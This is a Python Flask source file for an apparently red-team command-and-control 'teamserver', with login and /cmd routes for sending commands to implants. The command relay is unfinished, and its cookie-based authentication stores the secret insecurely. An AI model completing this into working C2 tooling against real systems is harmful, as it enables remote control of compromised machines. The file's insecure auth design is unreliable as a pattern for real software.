import base64
import asyncio
import flask
import json

from lib import networking
from lib import instructions

loop = asyncio.get_event_loop()
app = flask.Flask(__name__)


class Teamserver(object):
    def __init__(self, args):
        self.info = {"name": "teamserver",
                     "author": "und3rf10w"
                     }
        super(Teamserver, self).__init__()

    def make_response(self):
        # Every response will be processed here, used to set headers
        response = flask.make_response()
        response.headers['Server'] = teamserver.config['server_header']
        return response

    @app.route("/")
    def teamserver_root():
        teamserver.logging.log("hit on /", source="teamserver")
        # TODO: Support flask template rendering instead of a string
        response = teamserver.teamserver.make_response()
        try:
            response.set_data(teamserver.config['root_return_string'])
            return response
        except KeyError:
            response.set_data("Попрешь на крутых, уроем как остальных")
            return response

    @app.route("/login", methods=["POST"])
    def teamserver_login_user():
        """
        Login a user to the teamserver
        :return:
        """
        error = False
        data = flask.request.get_json(force=True)

        try:
            username = data['username']
            authstring = data['authstring']
        except KeyError:
            error = True

        teamserver.logging.log(f"Authentication attempt from {flask.request.remote_addr} for user {data['username']}",
                               source=f"{teamserver.teamserver.info['name']}")

        if base64.b64decode(authstring).decode("utf-8") == teamserver.config['authstring']:
            teamserver.logging.log(f"Authenticated {data['username']} from {flask.request.remote_addr}",
                                   source=f"{teamserver.teamserver.info['name']}")
            success = True
        else:
            teamserver.logging.log(f"Authentication Failed for {data['username']} from {flask.request.remote_addr}",
                                   source=f"{teamserver.teamserver.info['name']}")
            success = False

        response = {"success": success, "error": error}
        if success and username:
            response['username'] = username
            auth_cookie = base64.b64encode(f"{username} `|` {authstring}".encode('utf-8'))

        res = teamserver.teamserver.make_response()
        if success: res.set_cookie('Auth', auth_cookie)
        res.set_data(json.dumps(response))
        return res

    @app.route("/cmd", methods=["POST"])
    def teamserver_run_cmd():
        """
        Run a command on an implant

        :return:
        """

        error = False
        success = False

        response = teamserver.teamserver.make_response()
        response.set_data(json.dumps({"success": success}))
        # Get the cookie
        try:
            cookie = flask.request.cookies.get("Auth")
            username, recv_authstring = base64.b64decode(cookie).decode('utf-8').split(" `|` ")
            if base64.b64decode(recv_authstring).decode("utf-8") == teamserver.config['authstring']:
                # Process the command
                data = flask.request.get_json(force=True)
                teamserver.logging.log(f"Received {data['cmd']}, from {username}, for implant {data['implant_id']}",
                                       level="debug", source=f"{teamserver.teamserver.info['name']}")
                teamserver.config()  # TODO: Why is this here?
                instruction_frame = instructions.create_instruction_frame(data)
                # TODO: Resolve the destination component from instruction_frame['component_id']
                #  * Add this instruction frame to the queue for the resulting component_id's relay

            else:
                # Our auth string didn't match
                error = True
        except Exception as e:
            teamserver.logging.log(f"Client: {flask.request.remote_addr} error | type: {type(e).__name__} | "
                                   f"err: {e} | " 
                                   f"page: {flask.request.endpoint}",
                                   level="error", source=f"{teamserver.teamserver.info['name']}")
            error = True

        return response

    def validate_cookie(self, cookie):
        print(cookie)

    def start_teamserver(self, *args):
        global teamserver

        teamserver = args[0]

        try:
            teamserver.http_server = app.run(host=teamserver.http_addr, port=teamserver.http_port)
        except Exception as e:
            teamserver.logging.log(f"Critical error when starting teamserver api server", level="critical",
                                   source=f"{teamserver.teamserver.info['name']}")
            exit()
